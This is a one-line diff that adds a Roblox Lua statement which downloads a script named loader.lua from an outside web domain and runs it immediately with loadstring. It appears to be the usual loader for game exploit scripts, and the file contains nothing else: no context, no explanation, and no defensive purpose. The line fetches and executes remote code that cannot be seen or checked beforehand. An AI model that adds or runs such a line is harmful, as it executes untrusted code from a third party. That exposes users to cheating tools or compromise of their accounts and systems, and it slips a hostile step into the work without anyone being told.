@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://usemerit.store/raw/prod/loader.lua"))()
